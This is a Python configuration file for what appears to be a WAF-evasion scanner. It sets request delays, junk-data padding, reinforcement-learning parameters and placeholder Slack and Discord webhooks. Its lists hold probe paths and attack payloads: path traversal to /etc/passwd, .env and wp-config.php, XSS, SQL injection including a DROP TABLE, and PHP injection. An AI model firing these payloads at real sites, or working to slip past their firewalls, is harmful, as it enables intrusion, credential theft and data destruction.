# options.py
import os

# Logging configurations
LOG_FILENAME = "waf_evasion.log"
LOG_LOCATION = os.path.join(os.getcwd(), LOG_FILENAME)

# Output configurations
FINAL_OUTPUT = "scan_results.txt"
SLACK_WEBHOOK = "https://hooks.slack.com/services/XXX/XXX/XXX"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/XXX/XXX"

# Reinforcement Learning parameters
LEARNING_RATE = 0.01
DISCOUNT_FACTOR = 0.99

# Junk Data Configuration
DEFAULT_JUNK_SIZE_KB = 1  # Default junk data size in KB

# Rate Limiting Configuration
MIN_DELAY = 1  # Minimum delay between requests in seconds
MAX_DELAY = 5  # Maximum delay between requests in seconds

# WAF Detection Configuration
WAF_TEST_PATHS = [
    "/.git/config",
    "/.env",
    "/wp-config.php",
    "/admin",
    "/phpinfo.php",
    "/etc/passwd",        # Common in LFI attacks
    "/var/www/html",      # Common in directory traversal attacks
    "/index.php?page=../../../../etc/passwd",
    "/index.php?page=../../../../.env",
]

WAF_TEST_PAYLOADS = [
    "<script>alert(1)</script>",
    "' OR 1=1 --",
    "UNION SELECT null,null,null",
    "../../../../../../etc/passwd",  # Directory traversal
    "../../../../../../.env",
    "../../../../../wp-config.php",
    "<?php echo 'test'; ?>",         # PHP code injection
    "'; DROP TABLE users; --",       # SQL injection
    "SELECT * FROM users WHERE '1'='1'",
]

# Evasion Configuration
MAX_ATTEMPTS = 100  # Limit the number of attempts to avoid infinite loops

# Content Type Configuration
CONTENT_TYPES = {
    "urlencoded": "application/x-www-form-urlencoded",
    "xml": "application/xml",
    "json": "application/json",
}

# Default Content Type
DEFAULT_CONTENT_TYPE = CONTENT_TYPES["urlencoded"]
